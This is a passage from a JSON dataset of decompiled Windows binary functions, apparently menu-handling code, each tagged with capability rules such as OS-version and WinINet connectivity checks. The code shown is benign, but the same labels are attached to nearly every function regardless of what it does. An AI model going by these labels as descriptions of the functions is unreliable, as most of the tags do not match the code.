return;\n}\n",
        "token_count": 907
    },
    "00449f88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00449f88(uint32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_ECX;\n    uchar auStack256 [212];\n    uint uStack44;\n    uint32_t uStack40;\n    uint *puStack36;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *in_ECX;\n    uStack16 = in_ECX[1];\n    uStack12 = in_ECX[2];\n    uStack8 = in_ECX[3];\n    if (*(in_EAX + 0x92) != 0) {\n        puStack36 = &fcn.00449f88::var_10h;\n        uStack40 = &stack0xffffff00 | arg_8h & 0xff;\n        uStack44 = 0x449fbe;\n        (**(in_EAX + 0x90))();\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "0044b32c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0044b32c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    for (iVar1 = *(in_EAX + 100); (iVar1 != 0 && (*(iVar1 + 0x7c) == 0)); iVar1 = *(iVar1 + 100)) {\n    }\n    if (iVar1 == 0) {\n        iVar1 = fcn.0044bd10();\n        if (iVar1 != 0) {\n            uVar2 = *(iVar1 + 0x48);\n        }\n    }\n    else {\n        uVar2 = *(iVar1 + 0x7c);\n    }\n    return uVar2;\n}\n",
        "token_count": 168
    },
    "0044b3a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b3a8(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t arg_8h_00;\n    uint8_t uVar4;\n    uint32_t *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint32_t uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_10h = 0;\n    uStack60 = 0x44b58a;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack64;\n    fcn.00403454();\n    cVar2 = fcn.004033e4();\n    bVar5 = cVar2 == '\\0';\n    if (bVar5) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = bVar5;\n        fcn.0044b35c(&stack0xfffffffc);\n    }\n    bVar5 = !bVar5;\n    iVar3 = fcn.0044bd10();\n    var_ch = fcn.0044b32c();\n    fcn.004043b4();\n    if (uVar6) {\n        *arg_8h = 5;\n        *var_4h = -2;\n        bVar1 = false;\n    }\n    else if ((var_ch == 0) || ((0x7fffffff < *(in_EAX + 0x40) && (bVar5)))) {\n        if ((*(in_EAX + 0x4c) == 0) || (cVar2 = (**(**(in_EAX + 0x4c) + 0x1c))(),  cVar2 != '\\0')) {\n            *var_4h = -7;\n            bVar1 = false;\n        }\n        else {\n            *var_4h = 0x10;\n            if (!bVar5) {\n                *arg_8h = 0x10;\n            }\n            bVar1 = true;\n        }\n    }\n    else {\n        *var_4h = *(var_ch + 0x34);\n        if (!bVar5) {\n            *arg_8h = *(var_ch + 0x30);\n        }\n        bVar1 = true;\n    }\n    if ((bVar1) && (!bVar5)) {\n        *var_4h = *var_4h + 0xf;\n    }\n    if (!bVar5) {\n        *arg_8h = *arg_8h + 3;\n    }\n    fcn.00402c64();\n    if (iVar3 == 0) {\n        cVar2 = fcn.004033e4();\n        uVar4 = *0x60;\n        if (cVar2 == '\\0') {\n            uVar4 = 0;\n        }\n    }\n    else {\n        uVar4 = 0;\n    }\n    if (*(in_EAX + 0x60) == 0) {\n        fcn.00404040();\n    }\n    else {\n        fcn.00448e3c();\n        fcn.004042b4();\n    }\n    arg_8h_00 = *(uVar4 * 2 + 0x461cb8) | 0x560;\n    fcn.00449d78(arg_8h_00, 0, &var_20h);\n    *var_4h = *var_4h + (var_18h - var_20h) + 7;\n    if (*(in_EAX + 0xa2) != 0) {\n        (**(in_EAX + 0xa0))(arg_8h, var_4h);\n    }\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00403fa8(0x44b591);\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 943
    },
    "0044b5e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044b5e4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 100) != 0) && (iVar1 = fcn.0044b754(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.0044b764();\n            if ((in_EAX != iVar2) && ((*(iVar2 + 0x3d) != '\\0' && (*(iVar2 + 0x3f) == *(in_EAX + 0x3f))))) {\n                fcn.0044b62c();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 180
    },
    "0044b62c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b62c(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 != *(in_EAX + 0x38)) {\n        *(in_EAX + 0x38) = param_2;\n        if ((*(in_EAX + 100) != 0) && ((*(in_EAX + 0x1c) & 2) == 0)) {\n            uVar1 = fcn.00449ce8(*(in_EAX + 0x50), *(param_2 * 4 + 0x461c40));\n            sub.user32.dll_CheckMenuItem(uVar1);\n        }\n        if ((param_2 != 0) && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0044b5e4();\n        }\n    }\n    return;\n}\n",
        "token_count": 207
    },
    "0044b680": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b680(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == *(in_EAX + 0x39)) {\n        return;\n    }\n    *(in_EAX + 0x39) = param_2;\n    if (((**0x462204 != 2) || (iVar1 = fcn.0044b754(),  iVar1 == 0)) &&\n       ((in_EAX[0x19] == 0 || (*(in_EAX[0x19] + 0x6c) == 0)))) {\n        if ((in_EAX[0x19] != 0) && ((*(in_EAX + 7) & 2) == 0)) {\n            uVar2 = fcn.00449ce8(*(in_EAX + 0x14), *(param_2 * 4 + 0x461c48));\n            sub.user32.dll_EnableMenuItem(uVar2);\n        }\n        (**(*in_EAX + 0x3c))();\n        return;\n    }\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 275
    },
    "0044b6f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b6f8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x3f)) {\n        if (*(in_EAX + 100) != 0) {\n            fcn.0044bab8();\n            fcn.00449c88();\n        }\n        *(in_EAX + 0x3f) = param_2;\n        if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.0044b5e4();\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0044b764": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044b764(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) == 0) {\n        fcn.00448d90();\n    }\n    fcn.00413b64();\n    return;\n}\n",
        "token_count": 63
    },
    "0044b8e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b8e0(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(param_1 + 100) != 0) {\n        fcn.00448d90();\n    }\n    if (in_EAX[0x17] == 0) {\n        iVar1 = fcn.00403228();\n        in_EAX[0x17] = iVar1;\n    }\n    if ((-1 < param_2 + -1) && (param_2 + -1 < *(in_EAX[0x17] + 8))) {\n        iVar1 = fcn.00413b64();\n        if (*(param_1 + 0x3f) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(param_1 + 0x3f)) {\n            fcn.00413b64();\n            fcn.0044b6f8();\n        }\n    }\n    fcn.00449c88();\n    fcn.00413be0();\n    *(param_1 + 100) = in_EAX;\n    *(param_1 + 0x84) = in_EAX;\n    *(param_1 + 0x80) = fcn.0044bb58;\n    if (in_EAX[0xd] != 0) {\n        fcn.00449bb8();\n    }\n    fcn.0044b754();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 354
    },
    "0044b994": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044b994(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((-1 < param_2) && (in_EAX[0x17] != 0)) {\n        iVar1 = fcn.0044b754();\n        if (param_2 < iVar1) goto code_r0x0044b9ba;\n    }\n    fcn.00448d90();\ncode_r0x0044b9ba:\n    iVar1 = fcn.00413b64();\n    fcn.00413a54();\n    *(iVar1 + 100) = 0;\n    *(iVar1 + 0x80) = 0;\n    *(iVar1 + 0x84) = 0;\n    if (in_EAX[0xd] != 0) {\n        fcn.00449bb8();\n    }\n    fcn.0044b754();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 234
    },
    "0044bb58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bb58(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((arg_8h != '\\0') && ((*(in_EAX + 0x34) != 0 || (*(in_EAX + 0x6c) != 0)))) {\n        fcn.00449bb8();\n    }\n    if (*(in_EAX + 100) == 0) {\n        cVar1 = fcn.004033e4();\n        if (cVar1 != '\\0') {\n            fcn.0044d830();\n        }\n    }\n    else {\n        fcn.0044bb58(0);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0044c1b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044c1b4(uint param_1, uint param_2)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_ffffffbc;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_10h = 0;\n    var_ch = 0;\n    uStack40 = 0x44c2d6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    bVar1 = false;\n    var_4h = param_2;\n    iVar2 = fcn.00404268();\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            uVar3 = *(*in_EAX + -1 + iVar4);\n            if ((*(*0x4621f4 + (uVar3 >> 3)) >> (uVar3 & 7) & 1) != 0) {\n                bVar1 = true;\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (bVar1) {\n        iVar2 = fcn.00404268(&var_ch);\n        uVar5 = iVar2 == 2;\n        fcn.004044c8();\n        fcn.004043b4();\n        if (uVar5) {\n            fcn.00404268(&var_10h);\n            fcn.004044c8();\n            in_stack_ffffffbc = var_4h;\n            fcn.00404328(0x44c2ec, 0x44c310, var_4h, 0x44c304, 0x44c2f8, var_10h);\n        }\n        else {\n            in_stack_ffffffbc = 0x44c310;\n            fcn.00404328(0x44c310, var_4h, 0x44c304, 0x44c2f8, *in_EAX);\n        }\n    }\n    else if (var_8h != 0) {\n        fcn.00404550();\n    }\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.00403fcc(0x44c2dd);\n    return;\n}\n",
        "token_count": 594
    },
    "0044c314": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044c314(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_FS_OFFSET;\n    uchar uVar8;\n    uint uStack112;\n    uint uStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_20h;\n    uchar var_1ah;\n    char var_19h;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    var_48h = 0;\n    var_44h = 0;\n    var_40h = 0;\n    var_3ch = 0;\n    var_2ch = 0;\n    var_30h = 0;\n    var_34h = 0;\n    var_4h = 0;\n    var_18h = 0;\n    uStack96 = 0x44c7b3;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    var_1ah = 0;\n    puVar1 = &stack0xfffffffc;\n    var_19h = param_2;\n    if (param_2 != '\\0') {\ncode_r0x0044c370:\n        puStack92 = puVar1;\n        puStack104 = 0x44c37e;\n        fcn.00404040();\n        var_ch = NULL;\n        var_14h = NULL;\n        var_20h = NULL;\n        var_8h = NULL;\n        var_10h = 0;\n        uStack108 = 0x44c774;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        puStack104 = &stack0xfffffffc;\n        var_ch = fcn.00403228();\n        var_14h = fcn.00403228();\n        var_20h = fcn.00403228();\n        var_8h = fcn.00403228();\n        iVar3 = fcn.0044b754();\n        if (-1 < iVar3 + -1) {\n            do {\n                var_38h = iVar3;\n                iVar3 = fcn.0044b764();\n                uVar8 = *(iVar3 + 0x3e) == '\\0';\n                if (!uVar8) {\n                    fcn.0044b764();\n                    fcn.004043b4();\n                    if ((!uVar8) && (iVar3 = fcn.0044b764(),  *(iVar3 + 0x30) != 0)) {\n                        fcn.0044b764();\n                        fcn.0044e20c();\n                        fcn.00407b34();\n                        if (var_2ch == 0) {\n                            uVar4 = fcn.0044b764();\n                            fcn.0044b764(uVar4);\n                            (**(*var_20h + 100))();\n                        }\n                        else {\n                            iVar3 = fcn.0040c214();\n                            if ((iVar3 != 0) && (cVar2 = fcn.0044c100(&stack0xfffffffc),  cVar2 == '\\0')) {\n                                iVar3 = fcn.0044b764();\n                                fcn.0044b764(iVar3 + 0x30);\n                                fcn.0044e178();\n                                fcn.00403ffc();\n                                uVar4 = fcn.0044b764();\n                                fcn.0044b764(uVar4);\n                                (**(*var_20h + 100))();\n                            }\n                        }\n                    }\n                }\n                var_38h = var_38h + -1;\n                iVar3 = var_38h;\n            } while (var_38h != 0);\n        }\n        fcn.00404040();\n        iVar3 = (**(*var_20h + 0x14))();\n        if (-1 < iVar3 + -1) {\n            do {\n                var_38h = iVar3;\n                fcn.00404040();\n                (**(*var_14h + 8))();\n                (**(*var_ch + 0x44))();\n                iVar3 = (**(*var_14h + 0x14))();\n                iVar3 = iVar3 + -1;\n                if (-1 < iVar3) {\n                    do {\n                        (**(*var_14h + 0xc))();\n                        for (iVar7 = 1; iVar6 = fcn.00404268(),  iVar7 <= iVar6; iVar7 = iVar7 + 1) {\n                            uVar5 = *(var_30h + -1 + iVar7);\n                            if ((*(*0x4621f4 + (uVar5 >> 3)) >> (uVar5 & 7) & 1) == 0) {\n                                fcn.004044c8(&fcn.0044c314::var_44h);\n                                fcn.00407b34();\n                                cVar2 = fcn.0044c100(&stack0xfffffffc);\n                                if (cVar2 != '\\0') {\n                                    if (*(*0x462210 + 0xc) == '\\0') {\n                                        fcn.00404550();\n                                    }\n                                    else {\n                                        fcn.0044c1b4();\n                                    }\n                                    (**(*var_14h + 0x18))();\n                                    (**(*var_ch + 0x3c))();\n                                    (**(*var_14h + 0x48))();\n                                    break;\n                                }\n                            }\n                            else {\n                                iVar7 = iVar7 + 1;\n                            }\n                        }\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n                iVar3 = (**(*var_ch + 0x14))();\n                if (var_10h < iVar3) {\n                    fcn.0044c130(&stack0xfffffffc);\n                }\n                iVar3 = (**(*var_14h + 0x14))();\n                if (iVar3 < 1) break;\n                iVar3 = (**(*var_14h + 0x14))();\n                if (-1 < iVar3 + -1) {\n                    do {\n                        (**(*var_14h + 0x18))();\n                        var_28h = (**(*var_20h + 0x5c))();\n                        (**(*var_20h + 0x14))();\n                        (**(*var_20h + 0x70))();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                }\n                var_38h = var_38h + -1;\n                iVar3 = var_38h;\n            } while (var_38h != 0);\n        }\n        if (var_10h == 0) {\n            fcn.0044c130(&stack0xfffffffc);\n        }\n        iVar3 = (**(*var_8h + 0x14))();\n        var_1ah = 0 < iVar3;\n        iVar3 = (**(*var_8h + 0x14))();\n        if (-1 < iVar3 + -1) {\n            do {\n                var_38h = iVar3;\n                (**(*var_8h + 0xc))();\n                if ((((*(*0x462210 + 0xc) != '\\0') && (iVar3 = fcn.0040c214(),  iVar3 == 0)) && (var_18h != 0)) &&\n                   (iVar3 = fcn.0040c214(),  iVar3 == 0)) {\n                    fcn.00404268(&fcn.0044c314::var_48h);\n                    fcn.004044c8();\n                    fcn.0044c1b4();\n                    fcn.00404268();\n                    fcn.00404508();\n                }\n                (**(*var_8h + 0x18))();\n                fcn.00403ffc();\n                var_38h = var_38h + -1;\n                iVar3 = var_38h;\n            } while (var_38h != 0);\n        }\n        *in_FS_OFFSET = uStack112;\n        puStack104 = 0x44c77b;\n        uStack108 = 0x44c75b;\n        fcn.00403258();\n        uStack108 = 0x44c763;\n        fcn.00403258();\n        uStack108 = 0x44c76b;\n        fcn.00403258();\n        uStack108 = 0x44c773;\n        fcn.00403258();\n        return;\n    }\n    if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n        puStack104 = 0x44c368;\n        cVar2 = fcn.0044c968();\n        puVar1 = puStack92;\n        if (cVar2 != '\\0') goto code_r0x0044c370;\n    }\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x44c7ba;\n    uStack96 = 0x44c795;\n    fcn.00403fcc();\n    uStack96 = 0x44c7a2;\n    fcn.00403fcc();\n    uStack96 = 0x44c7aa;\n    fcn.00403fa8();\n    uStack96 = 0x44c7b2;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 2246
    },
    "0044c810": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0044c810(uint param_1, char param_2)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uStack24;\n    int32_t iStack20;\n    \n    uStack24 = 0;\n    if ((param_2 != '\\0') || (((*(in_EAX + 0x1c) & 0x10) == 0 && (in_EAX = fcn.0044c994(),  in_EAX != '\\0')))) {\n        iStack20 = 0;\n        iVar5 = 0;\n        iVar4 = 0;\n        iVar2 = fcn.0044b754();\n        iVar3 = iStack20;\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.0044b764();\n                if (*(iVar3 + 0x3e) != '\\0') {\n                    fcn.0044b764();\n                    cVar1 = fcn.0044c7ec();\n                    iVar3 = iVar4;\n                    if (cVar1 == '\\0') break;\n                    iVar3 = fcn.0044b764();\n                    *(iVar3 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n                iVar3 = iStack20;\n            } while (iVar2 != 0);\n        }\n        iStack20 = iVar3;\n        iVar4 = fcn.0044b754();\n        if (iStack20 <= iVar4 + -1) {\n            iVar3 = ((iVar4 + -1) - iStack20) + 1;\n            iVar4 = iStack20;\n            do {\n                fcn.0044b764();\n                cVar1 = fcn.0044c7ec();\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.0044b764();\n                    if (*(iVar2 + 0x3e) != '\\0') {\n                        if ((iVar5 != 0) && (*(iVar5 + 0x3e) == '\\0')) {\n                            *(iVar5 + 0x3e) = 1;\n                            uStack24 = 1;\n                        }\n                        iVar5 = 0;\n                        iStack20 = iVar4;\n                    }\n                }\n                else {\n                    if ((iVar5 != 0) && (*(iVar5 + 0x3e) != '\\0')) {\n                        *(iVar5 + 0x3e) = 0;\n                        uStack24 = 1;\n                    }\n                    iVar5 = fcn.0044b764();\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        in_EAX = fcn.0044b754();\n        iVar4 = iStack20 - (in_EAX - 1);\n        if (iVar4 == 0 || iStack20 < in_EAX - 1) {\n            iVar4 = iVar4 + -1;\n            do {\n                in_EAX = fcn.0044b764();\n                if (*(in_EAX + 0x3e) != '\\0') {\n                    fcn.0044b764();\n                    in_EAX = fcn.0044c7ec();\n                    if (in_EAX == '\\0') break;\n                    in_EAX = fcn.0044b764();\n                    *(in_EAX + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 != 0);\n        }\n    }\n    return CONCAT44(iStack20, in_EAX & 0xffffff00 | uStack24);\n}\n",
        "token_count": 860
    },
    "0044c968": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar fcn.0044c968(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3b);\n    if ((*(in_EAX + 0x3b) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.0044c968();\n        uVar1 = *((uVar1 & 0x7f) + 0x461bf0);\n    }\n    return *((uVar1 & 0x7f) + 0x461bf4);\n}\n",
        "token_count": 138
    },
    "0044c994": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuchar fcn.0044c994(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3c);\n    if ((*(in_EAX + 0x3c) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.0044c994();\n        uVar1 = *((uVar1 & 0x7f) + 0x461bf0);\n    }\n    return *((uVar1 & 0x7f) + 0x461bf4);\n}\n",
        "token_count": 138
    },
    "0044c9c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.0044c9c0(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.004496a8();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x84) = in_EAX;\n    *(iVar1 + 0x80) = *(*in_EAX + 0x38);\n    *(iVar1 + 0x70) = in_EAX;\n    iVar1 = fcn.00403228();\n    in_EAX[0x11] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x44d2d8;\n    *(in_EAX + 0x41) = 1;\n    fcn.0041951c();\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x3b) = 0;\n    *(iVar1 + 0x3c) = 0;\n    fcn.0044d6ec();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 366
    },
    "0044cb10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.0044cb10(uint32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0;\n    if ((((*(arg_8h - 1) == '\\0') && (*(arg_8h - 8) == *(in_EAX + 0x50))) ||\n        ((*(arg_8h - 1) == '\\x01' && (*(arg_8h - 8) == *(in_EAX + 0x34))))) ||\n       ((*(arg_8h - 1) == '\\x02' && (*(arg_8h - 8) == *(in_EAX + 0x60))))) {\n        *(arg_8h - 0xc) = in_EAX;\n        _auStack8 = 0x1000000;\n        uVar1 = arg_8h;\n    }\n    else {\n        uVar1 = fcn.0044b754();\n        uVar2 = uVar1;\n        if (-1 < uVar1 - 1) {\n            do {\n                uVar1 = arg_8h;\n                fcn.0044b764();\n                uVar1 = fcn.0044cb10(uVar1);\n                if (uVar1 != '\\0') {\n                    _auStack8 = 0x1000000;\n                    break;\n                }\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n    }\n    return uVar1 & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 398
    },
    "0044cbd8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
